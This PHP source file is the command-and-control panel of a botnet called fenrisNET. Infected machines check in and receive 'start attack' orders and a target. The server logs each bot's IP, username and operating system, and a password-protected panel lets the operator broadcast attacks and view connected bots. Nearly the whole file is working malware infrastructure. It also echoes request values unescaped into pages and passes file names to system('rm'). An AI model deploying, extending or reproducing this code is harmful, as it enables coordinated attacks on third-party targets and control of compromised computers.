<?php
/*
########################################################################
# Copyright 2015 Daniel Haake
#
# This file is part of fenrisNET
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
########################################################################
*/

$configFile = "data/config";
$passFile = "data/password";

// load config (parameters for attack)
$conf = fopen($configFile, "r");
$content = fread($conf, filesize($configFile));
fclose($conf);
$content = explode("\n", $content);

$order = $content[0];
$target = $content[1];

$timestamp = time();

// load password
$pw = fopen($passFile, "r");
$pwContent = fread($pw, filesize($passFile));
fclose($pw);
$curPw = explode("\n", $pwContent);
$curPw = $curPw[0];

if($_GET['p'] == "bot") {
	print $order."\n".$target;

	// save bot parameter
	$clientIpAddress = $_SERVER["REMOTE_ADDR"];

	// save bot if he not exists and override timestamp if he already exists
	$saveBot = fopen("data/bots/".$clientIpAddress, "w+");
	$writeBotsContent = $timestamp.";".$_GET['os'].";".$_GET['username'].";".$_GET['version'].";".$_GET['osdetail'].";".$_GET['architecture'];
	fwrite($saveBot, $writeBotsContent);
	fclose($saveBot);
	// delete all timed out bots
	$allBots = scandir("data/bots/");
	foreach($allBots as $bot) {
		$tmpBot = fopen("data/bots/".$bot, "r");
		$tmpBotContent = fread($tmpBot, filesize("data/bots/".$bot));
		fclose($tmpBot);
		$tmpBotContent = explode(";", $tmpBotContent);
		if(($timestamp - (int)$tmpBotContent[0]) > 60) {
			system("rm data/bots/".$bot);
		}
	}
}
elseif(hash("sha512", $_GET['p']) == $curPw) {
 	// delete all timed out bots
        $allBots = scandir("data/bots/");
        foreach($allBots as $bot) {
                $tmpBot = fopen("data/bots/".$bot, "r");
                $tmpBotContent = fread($tmpBot, filesize("data/bots/".$bot));
                fclose($tmpBot);
                $tmpBotContent = explode(";", $tmpBotContent);
                if(($timestamp - (int)$tmpBotContent[0]) > 60) {
                        system("rm data/bots/".$bot);
                }
        }

	// save new config
	if($_GET['order'] != "" && $_GET['target'] != "") {
		$writeConf = fopen($configFile, "w");
		fwrite($writeConf, $_GET['order']."\n".$_GET['target']);
		fclose($writeConf);
		$order = $_GET['order'];
		$target = $_GET['target'];
	}

	// save new password
	$pwMessage = 0;
	if($_GET['np'] != "") {
		$writePw = fopen($passFile, "w");
		fwrite($writePw, hash("sha512", $_GET['np'])."\n");
		fclose($writePw);
		$curPw = $_GET['np'];
		$pwMessage = 1;
	}

	// display panel
	print "<!DOCTYPE html>";
	print "<html>";
	print "<head>";
	print "<link rel=\"stylesheet\" href=\"//code.jquery.com/ui/1.11.3/themes/smoothness/jquery-ui.css\">";
	print "<link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\">";
	print "<script src=\"//code.jquery.com/jquery-1.10.2.js\"></script>";
	print "<script src=\"//code.jquery.com/ui/1.11.3/jquery-ui.js\"></script>";
	print "<link rel=\"stylesheet\" href=\"/resources/demos/style.css\">";
	print "<script>";
	print "$(function() {";
	print "$( \"#tabs\" ).tabs();";
	print "$( \"#accordion\" ).accordion({collapsible: true});";
	print "$( \"#attackorder\" ).selectmenu();";
	print "function runEffect() {";
        print "options = { percent: 100 };";
        print "$( \"#effect\" ).show( \"slide\", options, 500, callback );";
        print "};";
        print "function callback() {";
        print "setTimeout(function() {";
        print "$( \"#effect:visible\" ).removeAttr( \"style\" ).fadeOut();";
        print "}, 2000 );";
        print "};";
        print "$( \"#effect\" ).toggle(function() {";
        print "runEffect();";
        print "});";
        print "$( \"#effect\" ).hide();";
	print "});";
	print "</script>";
	print "<style>";
	print "select {";
	print "width: 150px;";
	print "font-size: 14px;";
	print "}";
        print "#effect { font-family: Arial, sans-serif; font-size: 14px; width: 95%; padding: 0.4em; text-align: center; background: #00B3FF; border: 0px; color: #ffffff;}";
	print "</style>";
	print "</head>";
	print "<body id=\"bodyLogin\">";

	print "<table border=\"0\" id=\"tablePanel\"><tr><td>";
	print "<img id=\"headlineLogin\" src=\"images/logo.png\"></td></tr><tr><td>";
	print "<div id=\"tabs\" style=\"background: #d3d3d3;\">";
	print "<ul>";
	print "<li><a href=\"#tabs-1\">Welcome</a></li>";
	print "<li><a href=\"#tabs-2\">Settings</a></li>";
	print "</ul>";

	print "<div id=\"tabs-1\" style=\"font-family:  Arial, sans-serif; font-size: 14px;\">";

 	if ($_GET['order'] != "" && $_GET['target'] != "") {
                print "<div align=\"center\">";
                print "<div id=\"effect\" class=\"ui-widget-content ui-corner-all\">";
                print "Bot commands updated.";
                print "</div>";
                print "</div>";
        }
	if ($_GET['np'] != "") {
                print "<div align=\"center\">";
                print "<div id=\"effect\" class=\"ui-widget-content ui-corner-all\">";
                print "Password changed.";
                print "</div>";
                print "</div>";
        }


	print "<div id=\"accordion\">";
	print "<h3>Attack Status</h3>";
	print "<div>";
	print "<table border=\"1\" class=\"attackStatusTable\" cellspacing=\"0\">";
	print "<tr><td class=\"attackStatusColumn\" width=\"25%\">Status:</td>";
	print "<td class=\"attackStatusColumn\">";
	if ($order == "no") {
		print "Not attacking.";
	}
	if ($order == "yes") {
		print "<div style=\"color: red;\">Attacking...</div>";
	}
	print "</td></tr>";
	print "<tr><td class=\"attackStatusColumn\">Target:</td>";
	print "<td class=\"attackStatusColumn\">".$target."</td></tr>";
	print "<tr><td class=\"attackStatusColumn\">Bots Online:</td>";
	print "<td class=\"attackStatusColumn\">";
	$allBots = scandir("data/bots/");
	print count($allBots)-2;
	print "</td></tr>";

	print "</table>";
	print "</div>";

	// change orders form
	print "<h3>Broadcast New Orders</h3>";
	print "<div>";
	print "<form method=\"get\">";
	print "<table border=\"0\"><tr>";
	print "<td><select name=\"order\" id=\"attackorder\">";
	print "<option value=\"yes\">start attack</option>";
	print "<option value=\"no\">stop attack</option>";
	print "</select></td>";
        print "<td><input id=\"input\" type=\"text\" name=\"target\" value=\"".$target."\"></td>";
	if ($_GET['np'] == "") {
		print "<input type=\"hidden\" name=\"p\" value=\"".$_GET['p']."\">";
	}
	else {
		print "<input type=\"hidden\" name=\"p\" value=\"".$_GET['np']."\">";
	}
        print "<td><input id=\"loginButton\" type=\"submit\" value=\"Submit\"></td>";
	print "</tr></table>";
        print "</form>";
	print "</div>";

	print "<h3>Bot Details</h3>";
        print "<div>";
	print "<table border=\"1\" class=\"attackStatusTable\" cellspacing=\"0\">";

	print "<tr><td class=\"attackStatusHead\">IP</td><td class=\"attackStatusHead\">System Name</td><td class=\"attackStatusHead\">Operating System</td><td class=\"attackStatusHead\">Architecture</td></tr>";
	$allBots = scandir("data/bots/");
	if(count($allBots) <= 2) {
		print "<tr><td colspan=\"4\" class=\"attackStatusColumn\">No entries.</td></tr>";
	}
	else {
		foreach($allBots as $bot) {
			if($bot != "." && $bot != "..") {
				$tmpBot = fopen("data/bots/".$bot, "r");
                		$tmpBotContent = fread($tmpBot, filesize("data/bots/".$bot));
                		fclose($tmpBot);
                		$curBot = explode(";", $tmpBotContent);
        			print "<tr><td class=\"attackStatusColumn\">".$bot."</td>";
        			print "<td class=\"attackStatusColumn\">";
				print $curBot[2];
				print "</td>";
				print "<td class=\"attackStatusColumn\">";
        			print $curBot[1]." ".$curBot[3]." (".$curBot[4].")";
        			print "</td>";
				print "<td class=\"attackStatusColumn\">";
        			print $curBot[5];
        			print "</td>";
			}
		}
	}
        print "</table>";
	print "</div>";
	print "</div>";
	print "</div>";

	// change password form
	print "<div id=\"tabs-2\" style=\"font-family:  Arial, sans-serif; font-size: 14px;\">";
	print "<form method=\"get\">";
	print "<table border=\"0\"><tr>";
        print "<td>Change password: </td><td><input id=\"input\" type=\"password\" name=\"p\" placeholder=\"old password\"></td>";
        print "<td><input id=\"input\" type=\"password\" name=\"np\" placeholder=\"new password\"></td>";
        print "<td><input id=\"loginButton\" type=\"submit\" value=\"Submit\"></td>";
	print "</tr></table>";
        print "</form>";

	print "</div>";
	print "</td></tr><tr><td>";
	print "<div id=\"logout\" align=\"right\"><form method=\"get\">";
        print "<input id=\"loginButton\" type=\"submit\" value=\"Logout\">";
        print "</div></form>";
	print "</td></tr></table>";
	print "</body>";
	print "</html>";
}
else {
	// login form
	print "<!DOCTYPE html>";
	print "<html>";
	print "<head>";
	print "<title>fenrisNET Login Panel</title>";

	print "<link rel=\"stylesheet\" href=\"//code.jquery.com/ui/1.11.3/themes/smoothness/jquery-ui.css\">";
        print "<link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\">";
        print "<script src=\"//code.jquery.com/jquery-1.10.2.js\"></script>";
        print "<script src=\"//code.jquery.com/ui/1.11.3/jquery-ui.js\"></script>";
        print "<link rel=\"stylesheet\" href=\"/resources/demos/style.css\">";
	print "<style>";
	print "#effect { font-family: Arial, sans-serif; font-size: 14px; width: 95%; padding: 0.4em; text-align: center; background: #aa0000; opacity: 0.75; border: 0px; color: #ffffff;}";
	print "</style>";
        print "<script>";
        print "$(function() {";
	print "function runEffect() {";
	print "options = { percent: 100 };";
	print "$( \"#effect\" ).show( \"shake\", options, 500, callback );";
	print "};";
	print "function callback() {";
	print "setTimeout(function() {";
	print "$( \"#effect:visible\" ).removeAttr( \"style\" ).fadeOut();";
	print "}, 2000 );";
	print "};";
	print "$( \"#effect\" ).toggle(function() {";
	print "runEffect();";
	print "});";
	print "$( \"#effect\" ).hide();";
	print "});";
        print "</script>";

	print "</head>";
	print "<body id=\"bodyLogin\">";

	print "<table border=\"0\" id=\"loginTable\"><tr><td>";
	print "<img id=\"headlineLogin\" src=\"images/logo.png\">";
	print "</td></tr><tr><td>";
	print "<div id=\"loginForm\">";
	print "<form method=\"get\">";
	print "<table border=\"0\" align=\"center\">";
	print "<tr><td>";
	print "<input id=\"input\" type=\"password\" name=\"p\" placeholder=\"Password\"></td>";
	print "<td><input id=\"loginButton\" type=\"submit\" value=\"Login\"></td></tr>";
	print "</form>";
	print "</div>";
	print "</table>";

	print "</td></tr><tr><td>";
	if ($curPw != hash("sha512", $_GET['p']) && $_GET['p'] != "") {
		print "<div align=\"center\">";
		print "<div id=\"effect\" class=\"ui-widget-content ui-corner-all\">";
		print "Wrong password!";
		print "</div>";
		print "</div>";
	}
	print "</td></tr></table>";

	print "</body>";
	print "</html>";
}
?>
